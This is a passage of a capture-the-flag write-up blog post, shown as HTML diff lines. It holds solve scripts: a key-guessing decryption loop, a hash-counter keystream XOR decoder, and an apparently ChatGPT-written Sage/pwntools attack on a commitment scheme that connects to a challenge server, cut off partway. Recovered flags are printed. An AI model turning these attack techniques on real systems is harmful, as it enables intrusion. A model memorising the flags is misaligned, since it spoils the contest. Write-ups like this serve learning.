+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;k6&#34;</span>: hashlib<span style="color:#f92672">.</span>sha256(hashlib<span style="color:#f92672">.</span>sha256(machine_id <span style="color:#f92672">+</span> task_id <span style="color:#f92672">+</span> ts_le <span style="color:#f92672">+</span> stage_hash_b64)<span style="color:#f92672">.</span>digest() <span style="color:#f92672">+</span> kdf_salt_raw <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;rocsc/vault&#34;</span>)<span style="color:#f92672">.</span>digest(),
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> kname, key <span style="color:#f92672">in</span> key_variants<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> aname, aad <span style="color:#f92672">in</span> aad_variants<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>        pt <span style="color:#f92672">=</span> dec(key, aad)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> pt <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[+] HIT&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;key variant:&#34;</span>, kname)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;aad variant:&#34;</span>, aname)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;plaintext bytes:&#34;</span>, pt)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;plaintext hex  :&#34;</span>, pt<span style="color:#f92672">.</span>hex())
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;plaintext ascii:&#34;</span>, pt<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;flag: CTF{&#34;</span> <span style="color:#f92672">+</span> pt<span style="color:#f92672">.</span>hex() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;}&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">SystemExit</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[-] no hit&#34;</span>)
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/unr-2026/ram.png#center"></p>
+<p><code>CTF{55eb337497c226fadcd74648227da4831106f06439145d500bb383b47bfa8745}</code></p>
+<h2 id="relay-in-the-noise">Relay in the Noise<a hidden class="anchor" aria-hidden="true" href="#relay-in-the-noise">#</a></h2>
+<p>I struggled with this challenge for quite a while, and my teammate was the one who solved it, but I&rsquo;m going to include this because it was pretty interesting. There were a bunch of UDP packets, each stream containing a <code>noise:i:hash</code> value, then the 120th one with some amateur radio communication.</p>
+<p>What worked was extracting the <code>BLT/NN/17</code> base32 strings, concatenating all of them and decoding them. So now we have a chipertext that is 128 bytes long.</p>
+<p>We also had a hint, <code>sha(lower(grid)|ssid)</code>, where we were given a <code>fn31pr</code> grid and a ssid of 9. Since sha256 only produced 32 bytes, that meant we needed a key that was 5 times longer.</p>
+<p>So the way to do it was to concatenate the hash with a counter, like so: <code>sha256(b&quot;fn31pr|9&quot; + b&quot;\x00\x00\x00\x00&quot;)</code> + <code>sha256(b&quot;fn31pr|9&quot; + b&quot;\x00\x00\x00\x01&quot;)</code> + <code>sha256(b&quot;fn31pr|9&quot; + b&quot;\x00\x00\x00\x02&quot;)</code>&hellip; Until the key&rsquo;s length got to the ciphertext&rsquo;s length, then just xor them.</p>
+<p>What worked was this script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>parts <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span>:  <span style="color:#e6db74">&#34;IDQ4TVGWTBWZ&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">2</span>:  <span style="color:#e6db74">&#34;KAO4XDIUCOBH&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">3</span>:  <span style="color:#e6db74">&#34;5N5TTSJ2AU5B&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4</span>:  <span style="color:#e6db74">&#34;3VJH62ZYAAKA&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">5</span>:  <span style="color:#e6db74">&#34;Y3ZIXF64WXEP&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">6</span>:  <span style="color:#e6db74">&#34;7ROLYTNENRCS&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>:  <span style="color:#e6db74">&#34;2BBQRJXFOABS&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">8</span>:  <span style="color:#e6db74">&#34;FT7NWEANE6EA&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">9</span>:  <span style="color:#e6db74">&#34;RKRMBFJ3CLDN&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">10</span>: <span style="color:#e6db74">&#34;UGELST6IVAEZ&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">11</span>: <span style="color:#e6db74">&#34;OLTCN4GR56ZE&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">12</span>: <span style="color:#e6db74">&#34;7N4QBIQBD6JX&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">13</span>: <span style="color:#e6db74">&#34;SXGURNDWX5E2&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">14</span>: <span style="color:#e6db74">&#34;ZUXTQ3MIKM3O&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">15</span>: <span style="color:#e6db74">&#34;2DJLMZJSZQDH&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">16</span>: <span style="color:#e6db74">&#34;KH7KU5MJYNTU&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">17</span>: <span style="color:#e6db74">&#34;CO7CGNQ6ZUYQ&#34;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>b32 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(parts[i] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">18</span>))
+</span></span><span style="display:flex;"><span>b32 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#f92672">*</span> ((<span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> len(b32) <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b32decode(b32)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>seed <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;fn31pr|9&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> len(ks) <span style="color:#f92672">&lt;</span> len(cipher):
+</span></span><span style="display:flex;"><span>    ks <span style="color:#f92672">+=</span> hashlib<span style="color:#f92672">.</span>sha256(seed <span style="color:#f92672">+</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;I&#34;</span>, counter))<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>    counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>plain <span style="color:#f92672">=</span> bytes(c <span style="color:#f92672">^</span> k <span style="color:#66d9ef">for</span> c, k <span style="color:#f92672">in</span> zip(cipher, ks[:len(cipher)]))
+</span></span><span style="display:flex;"><span>msg <span style="color:#f92672">=</span> zlib<span style="color:#f92672">.</span>decompress(plain)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(msg)
+</span></span></code></pre></div><p>Which gave us the flag, <code>UNR{4x25_p47h5_4nd_6r1d_5qu4r35_73ll_7h3_570ry_2fee56dc8f22f6a7}</code>.</p>
+<h2 id="toxicwaste">toxicwaste<a hidden class="anchor" aria-hidden="true" href="#toxicwaste">#</a></h2>
+<p>Since it was cryptography, everyone just used ChatGPT and got a working script in three prompts. What was weird at first is I thought the server wasn&rsquo;t responding, but it was just that it was taking a while to compute the huge values for p. I doubt there&rsquo;s any chance I&rsquo;d understand this script so I won&rsquo;t bother trying to. But here it is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env sage -python</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sage.all <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ast
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;35.234.72.251&#34;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">30847</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;info&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recv_until_token</span>(token: bytes) <span style="color:#f92672">-&gt;</span> bytes:
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> token <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>        chunk <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">300</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> chunk:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">EOFError</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Connection closed while waiting for </span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">!r}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">+=</span> chunk
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recv_line_after_prefix</span>(prefix: bytes) <span style="color:#f92672">-&gt;</span> bytes:
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> recv_until_token(prefix)
+</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>index(prefix) <span style="color:#f92672">+</span> len(prefix)
+</span></span><span style="display:flex;"><span>    rest <span style="color:#f92672">=</span> data[idx:]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> rest:
+</span></span><span style="display:flex;"><span>        chunk <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">300</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> chunk:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">EOFError</span>(<span style="color:#e6db74">&#34;Connection closed while waiting for line end&#34;</span>)
+</span></span><span style="display:flex;"><span>        rest <span style="color:#f92672">+=</span> chunk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    line, leftover <span style="color:#f92672">=</span> rest<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> leftover:
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>unrecv(leftover)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> line
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recv_pub_expr</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Read the huge `pub = [...]` object safely, preserving any trailing bytes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    such as &#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">C = &#39; by pushing them back with io.unrecv().
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> recv_until_token(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pub = [&#34;</span>)
+</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>index(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pub = [&#34;</span>) <span style="color:#f92672">+</span> len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pub = &#34;</span>)
+</span></span><span style="display:flex;"><span>    expr <span style="color:#f92672">=</span> data[idx:]  <span style="color:#75715e"># starts with &#39;[&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    depth <span style="color:#f92672">=</span> expr<span style="color:#f92672">.</span>count(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;[&#34;</span>) <span style="color:#f92672">-</span> expr<span style="color:#f92672">.</span>count(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;]&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> depth <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        chunk <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">300</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> chunk:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">EOFError</span>(<span style="color:#e6db74">&#34;Connection closed while reading pub&#34;</span>)
+</span></span><span style="display:flex;"><span>        expr <span style="color:#f92672">+=</span> chunk
+</span></span><span style="display:flex;"><span>        depth <span style="color:#f92672">+=</span> chunk<span style="color:#f92672">.</span>count(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;[&#34;</span>) <span style="color:#f92672">-</span> chunk<span style="color:#f92672">.</span>count(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;]&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    end <span style="color:#f92672">=</span> expr<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;]&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> end <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        candidate <span style="color:#f92672">=</span> expr[: end <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            val <span style="color:#f92672">=</span> ast<span style="color:#f92672">.</span>literal_eval(candidate<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>            leftover <span style="color:#f92672">=</span> expr[end <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> :]
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> leftover:
+</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>unrecv(leftover)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> val
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>            end <span style="color:#f92672">=</span> expr<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;]&#34;</span>, end <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Could not parse pub list&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recv_next_z</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Server prints `z = ...</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n` and then waits with `input(&#34;y = &#34;)`.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    The `y = ` prompt has no newline, so we only need to wait for the z-line.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        line <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">300</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> line:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">EOFError</span>(<span style="color:#e6db74">&#34;Connection closed while waiting for z&#34;</span>)
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>decode(errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ignore&#34;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> s<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;z = &#34;</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> Integer(s<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;=&#34;</span>, <span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>strip())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Read p and pub</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span>p_line <span style="color:#f92672">=</span> recv_line_after_prefix(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;p = &#34;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> Integer(p_line<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip())
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;p received (</span><span style="color:#e6db74">{</span>len(str(p))<span style="color:#e6db74">}</span><span style="color:#e6db74"> digits)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pub_raw <span style="color:#f92672">=</span> recv_pub_expr()
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;pub received (</span><span style="color:#e6db74">{</span>len(pub_raw)<span style="color:#e6db74">}</span><span style="color:#e6db74"> points)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Optional visibility into already-buffered bytes</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    extra <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> extra:
+</span></span><span style="display:flex;"><span>        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;extra bytes after pub: </span><span style="color:#e6db74">{</span>extra<span style="color:#e6db74">!r}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>unrecv(extra)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Rebuild curve exactly like the server</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span>E <span style="color:#f92672">=</span> EllipticCurve(GF(p), [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is the real deterministic G1 used by the challenge</span>
+</span></span><span style="display:flex;"><span>true_G1_E <span style="color:#f92672">=</span> E<span style="color:#f92672">.</span>gens()[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span>o <span style="color:#f92672">=</span> true_G1_E<span style="color:#f92672">.</span>order()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Fp2 <span style="color:#f92672">=</span> GF(p<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span>, <span style="color:#e6db74">&#34;w&#34;</span>, modulus<span style="color:#f92672">=</span>[<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>])  <span style="color:#75715e"># w^2 + w + 1 = 0</span>
+</span></span><span style="display:flex;"><span>w <span style="color:#f92672">=</span> Fp2<span style="color:#f92672">.</span>gen()
+</span></span><span style="display:flex;"><span>E2 <span style="color:#f92672">=</span> EllipticCurve(Fp2, [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>true_G1 <span style="color:#f92672">=</span> E2(true_G1_E)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pub_pts <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>pub_coeffs <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (xy, c) <span style="color:#f92672">in</span> pub_raw:
+</span></span><span style="display:flex;"><span>    x, y <span style="color:#f92672">=</span> xy
+</span></span><span style="display:flex;"><span>    P <span style="color:#f92672">=</span> E((Integer(x), Integer(y)))
+</span></span><span style="display:flex;"><span>    pub_pts<span style="color:#f92672">.</span>append(P)
+</span></span><span style="display:flex;"><span>    pub_coeffs<span style="color:#f92672">.</span>append(Integer(c) <span style="color:#f92672">%</span> o)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> len(pub_pts)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> n <span style="color:#f92672">==</span> <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send C immediately to avoid timeout</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use the real G1, so commitment scalar is c = 1.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span>recv_until_token(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C = &#34;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Got C prompt&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Integer(true_G1_E[<span style="color:#ae81ff">0</span>])<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>Integer(true_G1_E[<span style="color:#ae81ff">1</span>])<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Sent early commitment C = G1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Distortion map for supersingular curve y^2 = x^3 + 1</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># psi(x,y) = (w*x, y)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">psi</span>(P):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> E2((w <span style="color:#f92672">*</span> Fp2(P[<span style="color:#ae81ff">0</span>]), Fp2(P[<span style="color:#ae81ff">1</span>])))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Locate the true G1 inside the scrambled pub list</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    g1_index <span style="color:#f92672">=</span> next(i <span style="color:#66d9ef">for</span> i, P <span style="color:#f92672">in</span> enumerate(pub_pts) <span style="color:#66d9ef">if</span> P <span style="color:#f92672">==</span> true_G1_E)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">StopIteration</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Could not find the actual G1 in the public setup&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found true G1 at scrambled index </span><span style="color:#e6db74">{</span>g1_index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------------------------</span>
